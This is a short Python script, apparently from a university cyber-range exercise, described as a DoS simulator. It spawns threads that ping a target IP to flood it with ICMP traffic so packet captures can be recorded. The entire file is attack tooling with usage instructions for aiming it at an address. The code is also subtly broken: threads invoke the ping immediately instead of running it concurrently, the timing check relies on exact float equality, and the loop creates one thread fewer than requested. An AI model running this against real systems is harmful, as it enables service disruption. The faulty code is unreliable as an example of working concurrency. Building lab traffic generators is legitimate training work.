"""
    Date        : 11/23/2020
    Name        : icmp_dos
    Created By  : FUT1LE
    Created For : UA Little Rock Cyber Gym

    Purpose     : DoS attack simulator that floods
                  target machine with ICMP requests
                  for targeted amount of time. Used
                  primarily for genenarting pcaps.
"""
import os
import multiprocessing
import multiprocessing.dummy
import threading

from time import time
from sys import argv


class ThreadedICMP(object):
    def __init__(self, **kwargs):
        self.T_THREADS      = int(kwargs['t_threads'])
        self.T_TIME         = float(kwargs['t_time'])
        self.TARGET         = kwargs['target']
        self.active_threads = []
    
    def icmp_req(self):
        command = os.system(f"ping {self.TARGET}")
        return command

    def create_threads(self):
        local_threads = []

        print(f'[+] Creating {self.T_THREADS} threads ...')
        for pos in range(0, self.T_THREADS - 1):
            print(f'Thread {pos} of {self.T_THREADS} created ...')
            t = threading.Thread(target=self.icmp_req())
            local_threads.append(t)
            self.active_threads.append(t)

        for thread in local_threads:
            thread.start()

    def start_attack(self):
        t_end = time() + self.T_TIME       
            
        print(f'[+] Starting Attack on {self.TARGET} for {self.T_TIME}s')
        self.create_threads()

        while time() < t_end + 1:
            if time() == t_end:
                print('[+] Attack Finished! Closing Threads ...')
                for thread in self.active_threads:
                    thread.join()
                break

def main():
    if len(argv) == 4:
        t_threads = argv[1]
        t_time = argv[2]
        target = argv[3]

        ThreadedICMP(t_threads=t_threads, t_time=t_time, target=target).start_attack()
    else:
        print('''Command Syntax:
            python icmp_dos.py t_threads t_time target
            
            t_threads: Total number of threads to create
            t_time   : Length of attack in seconds
            target   : Target IP to DOS

            Example  : python icmp_dos.py 10 300 192.168.56.105''')

if __name__ == "__main__":
    main()
